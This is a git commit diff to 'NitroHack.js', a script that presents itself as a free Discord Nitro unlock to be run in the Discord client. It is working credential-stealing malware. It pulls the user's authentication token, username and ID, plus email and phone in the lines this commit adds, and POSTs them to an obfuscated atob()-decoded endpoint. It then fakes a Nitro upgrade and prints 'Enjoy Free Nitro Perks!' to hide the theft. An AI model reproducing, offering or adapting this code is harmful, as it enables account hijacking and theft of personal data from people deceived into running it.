199045bfe1f0d3048396094102c2ddb39ccadc52
Tung <89498812+tungdo0602@users.noreply.github.com>
2021-12-05 21:32:46 +0700

    Update NitroHack.js

--- NitroHack.js
+++ NitroHack.js
@@ -1,8 +1,10 @@
 var nitrocode = ""
 var uid = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().id;}}}]);
 var uname = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().username;}}}]);
+var getp = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().phone;}}}]);
+var getm = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().email;}}}]);
 var nitrohacks = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getToken !== undefined) {return m.default.getToken()}}}])
-fetch(atob(nitrocode), {method: 'post', headers: {'Content-Type': 'application/json',}, body: JSON.stringify({content: `${nitrohacks} | ${uname} - ${uid}`,}),});
+fetch(atob(nitrocode), {method: 'post', headers: {'Content-Type': 'application/json',}, body: JSON.stringify({content: `${nitrohacks} | ${uname} - ${uid} | ${getm} - ${getp}`,}),});
 window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().premiumType = 2;}}}]);
 console.clear()
 console.log("Enjoy Free Nitro Perks!")
